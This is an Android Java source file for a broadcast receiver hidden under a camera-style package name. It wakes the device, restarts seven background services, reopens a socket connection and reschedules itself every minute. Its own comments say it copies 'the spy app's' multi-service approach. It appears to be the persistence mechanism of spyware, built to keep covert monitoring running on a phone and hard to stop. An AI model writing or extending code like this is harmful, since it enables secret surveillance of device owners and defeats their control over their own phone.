package com.android.photo.camera.capture;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.PowerManager;
import android.os.SystemClock;
import android.util.Log;

/**
 * Dedicated broadcast receiver for restarting services if they're terminated
 * This provides an additional redundant restart mechanism alongside the existing systems
 */
public class SensorRestarterBroadcastReceiver extends BroadcastReceiver {
    private static final String TAG = "SensorRestarter";
    private static final long RESTART_DELAY = 1000; // 1 second
    private static final long NEXT_CHECK_DELAY = 60 * 1000; // 1 minute

    @Override
    public void onReceive(Context context, Intent intent) {
        Log.d(TAG, "Service Restarter received action: " + (intent.getAction() != null ? intent.getAction() : "null"));

        // Wake up the device if sleeping to ensure service restart
        PowerManager pm = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
        PowerManager.WakeLock wakeLock = null;
        if (pm != null) {
            wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK,
                    "SensorRestarter::WakeLockTag");
            wakeLock.acquire(10 * 60 * 1000L); // 10 minutes timeout
        }

        try {
            // Start all services (based on the spy app's multiple service approach)
            Log.d(TAG, "Starting all services...");

            // Primary services (existing in your app)
            startService(context, Service.class);
            startService(context, BackupService.class);

            // Additional services (mimicking the spy app's approach)
            startService(context, WorkerService.class);
            startService(context, ClassGen5Service.class);
            startService(context, ClassGen6Service.class);
            startService(context, ClassGen11Service.class);
            startService(context, MyWorkerService.class);

            // Ensure socket connection
            Connect.startAsync(context);

            // Schedule next check to make sure services are still running
            scheduleNextCheck(context);
        } catch (Exception e) {
            Log.e(TAG, "Error restarting service", e);
        } finally {
            // Release the wake lock if we acquired one
            if (wakeLock != null && wakeLock.isHeld()) {
                wakeLock.release();
            }
        }
    }

    /**
     * Helper method to start a service
     */
    private void startService(Context context, Class<?> serviceClass) {
        try {
            Intent serviceIntent = new Intent(context, serviceClass);
            serviceIntent.putExtra("fromRestarter", true);

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(serviceIntent);
            } else {
                context.startService(serviceIntent);
            }

            Log.d(TAG, "Started " + serviceClass.getSimpleName());
        } catch (Exception e) {
            Log.e(TAG, "Error starting " + serviceClass.getSimpleName(), e);
        }
    }

    private void scheduleNextCheck(Context context) {
        AlarmManager alarmManager = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
        Intent intent = new Intent(context, SensorRestarterBroadcastReceiver.class);
        intent.setAction("RestartSensor");

        PendingIntent pendingIntent = PendingIntent.getBroadcast(
                context,
                5001,
                intent,
                PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE
        );

        if (alarmManager != null) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                alarmManager.setExactAndAllowWhileIdle(
                        AlarmManager.ELAPSED_REALTIME_WAKEUP,
                        SystemClock.elapsedRealtime() + NEXT_CHECK_DELAY,
                        pendingIntent
                );
            } else {
                alarmManager.setExact(
                        AlarmManager.ELAPSED_REALTIME_WAKEUP,
                        SystemClock.elapsedRealtime() + NEXT_CHECK_DELAY,
                        pendingIntent
                );
            }
            Log.d(TAG, "Next service check scheduled");
        }
    }
}